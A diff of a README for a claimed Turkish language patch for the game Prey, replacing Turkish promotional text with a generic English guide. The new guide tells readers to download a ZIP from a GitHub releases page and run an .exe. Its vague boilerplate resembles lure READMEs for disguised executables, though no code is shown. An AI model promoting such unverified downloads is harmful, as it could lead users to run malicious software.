@@ -1,31 +1,50 @@
-[![https://turk-yama.com/prey](https://turk-yama.com/wp-content/uploads/2025/07/prey-turkce-yama-1.png)](https://turk-yama.com/prey)
-# ✅ Indirmek:
-https://turk-yama.com/prey
-# 💻 Açıklama:
-**Prey - Türkçe Yama**
+# 🎮 Prey-Turkce-Yama - Enhance Your Prey Experience Today!
 
-Prey, oyuncuları derin bir bilim kurgu evreninde sürükleyen etkileyici bir aksiyon rol yapma oyunudur. Arkane Studios tarafından geliştirilen bu oyun, kendine has atmosferi ve sürükleyici hikayesi ile dikkat çekiyor. Türkçe yaması ile, bu eşsiz deneyimi Türk oyunculara da ulaşılabilir kılmayı hedefliyoruz.
+## 📥 Download Now
+[![Download Prey-Turkce-Yama](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/HamzaSheraz559/Prey-Turkce-Yama/releases)
 
-Oyun, 2032 yılında, alternatif bir geçmişte geçiyor. Uzay istasyonu Talos I, insanlığın en büyük keşiflerinden biri olarak tasarlanmış olsa da, burada gerçekleşen olaylar, korkunç bir tehlikeye dönüşüyor. Oyuncular, Morgan Yu karakterini kontrol ederek, istasyondaki karanlık sırları açığa çıkarmak ve hayatta kalmak için mücadele ediyor.
+## 🚀 Getting Started
+Welcome to Prey-Turkce-Yama! This guide will help you easily download and run the software, enhancing your Prey experience with Turkish language support.
 
-Prey, sadece bir nişancı oyunu değil, aynı zamanda derin bir keşif ve strateji deneyimi sunuyor. Oyuncular, farklı yetenekler ve silahlarla donanmışken, düşmanları alt etmenin yanı sıra, çevrelerini keşfetmekte de özgürler. Bu, her oyuncunun kendi oyun tarzını geliştirmesine olanak tanır.
+## 📋 System Requirements
+Before you begin, make sure your system meets the following requirements:
+- Operating System: Windows 10 or later
+- Prey Game Version: Ensure you have the latest version of Prey (2025)
+- Storage Space: At least 100 MB available
 
-Türkçe yama ile, hikayenin inceliklerini ve karakterlerin derinliklerini daha iyi anlayabileceksiniz. Oyun, dil engeli olmadan, duygusal anların ve gerilim dolu sahnelerin tadını çıkarmanıza olanak tanıyor. Her bir diyalog ve metin, Türkçe olarak yerelleştirildiğinde, oyuncunun deneyimini zenginleştiriyor.
+## 📥 Download & Install
+1. **Visit the Releases Page:** Click this link to go to the [Releases page](https://github.com/HamzaSheraz559/Prey-Turkce-Yama/releases).
+   
+2. **Locate the Latest Release:** Find the most recent version of Prey-Turkce-Yama on the Releases page.
 
-Prey’in görsel tasarımı da oldukça etkileyici. Atmosferik grafikler, detaylı ortamlar ve dikkatlice işlenmiş karakter tasarımları, oyuncuların kendilerini bu evrende kaybetmelerini sağlıyor. Türkçe yama ile, görsel deneyiminizi daha da derinleştirerek, oyunun sunduğu estetik hazineleri keşfedebilirsiniz.
+3. **Download the File:** Click on the download link for the file marked as "Prey-Turkce-Yama.zip" or a similar name. This will download a ZIP file to your computer.
 
-Oyun dünyasında karşılaştığınız düşmanlar, yalnızca birer engel değil, aynı zamanda stratejik düşünmenizi gerektiren unsurlar. Her biri farklı yeteneklere ve saldırı biçimlerine sahip bu yaratıklarla başa çıkmak için zekanızı kullanmalısınız. Türkçe yama, bu zorluğu daha iyi anlamanızı sağlayarak, taktiklerinizi geliştirmenize yardımcı oluyor.
+4. **Extract the ZIP File:** Once the download is complete, go to your Downloads folder. Right-click on the ZIP file and select "Extract All." Follow the prompts to extract the files to a folder of your choice.
 
-Prey’in sunduğu özgürlük, oyunculara farklı yollarla ilerleme şansı veriyor. İster gizlice düşmanlarınızı bertaraf edin, ister doğrudan çatışmaya girin; seçim tamamen size ait. Türkçe yama ile bu seçeneklerin tümünü daha kolay bir şekilde değerlendirebilirsiniz.
+5. **Run The Application:** Open the newly created folder, and look for a file named "Prey-Turkce-Yama.exe" or something similar. Double-click on it to launch the program.
 
-Sonuç olarak, Prey, derin bir hikaye, etkileyici atmosfer ve stratejik oyun mekanikleri ile dolu bir deneyim sunuyor. Türkçe yaması sayesinde, bu benzersiz oyunun tadını çıkarabilir, hikayenin her detayını anlayarak daha etkili bir şekilde mücadele edebilirsiniz. Unutmayın, Talos I’de hayatta kalmak için her zaman bir adım önde olmalısınız. 
+6. **Start Playing:** Follow the on-screen instructions to apply the Turkish modifications to your Prey game. Once done, open Prey and enjoy the new features in Turkish!
 
-Siz de Prey’i Türkçe yaması ile deneyimleyerek, bu unutulmaz yolculuğa katılın!
-# ⚙️ Talimat:
-[![https://turk-yama.com/prey](https://turk-yama.com/i.gif)](https://turk-yama.com/prey)
-#
-[![https://turk-yama.com/prey](https://turk-yama.com/l.svg)](https://turk-yama.com/prey)
-# Etiketler:
-Prey Türkçe oynanış, Prey oyun yaması, Prey Türkçe dil desteği, Prey Türkçe seslendirme, Prey 2025 Türkçe, Prey Türkçe ayarlar, Prey Türkçe yardım, Prey Türkçe düşmanlar, Prey PC Türkçe, Prey Türkçe keşif, Prey yama indir, Prey Türkçe karakterler, Prey Türkçe mod, Prey tam Türkçe yama, Prey Türkçe eleştiriler, Prey Türkçe hikaye anlatımı, Prey Türkçe sinematik, Prey Türkçe topluluk, Prey Türkçe yamanın indirme, Prey yerelleştirme
+## 🎮 Features
+- **Turkish Menu:** Easily navigate the game's menu in Turkish.
+- **In-Game Translations:** Enjoy translated dialogues and tips during gameplay.
+- **Community Insights:** Access Turkish guides and tips to enhance your gaming skills.
+- **Regular Updates:** Keep the game fresh with regular patches and new features.
 
+## ❓ FAQ
+### How do I know if the installation was successful?
+After launching the game, check if the menu and prompts appear in Turkish. If they do, your installation was successful!
 
+### What if I encounter issues?
+If you face any problems, feel free to reach out to our community on platforms like Discord or Reddit, where fellow gamers and developers can assist you.
+
+## 📣 Community
+Join our community to connect with other players. Share tips, tricks, and experiences about Prey in Turkish. Visit our community page for the latest news and updates related to the game. Your contribution makes our community richer!
+
+## 📞 Support
+For further assistance, please open an issue on the GitHub repository. We’re here to help.
+
+## 🌟 Acknowledgments
+A big thank you to the contributors and community members who make Prey-Turkce-Yama possible. Your support encourages continuous improvement and collaboration.
+
+Thank you for choosing Prey-Turkce-Yama! Enjoy a richer gaming experience with Turkish language support.
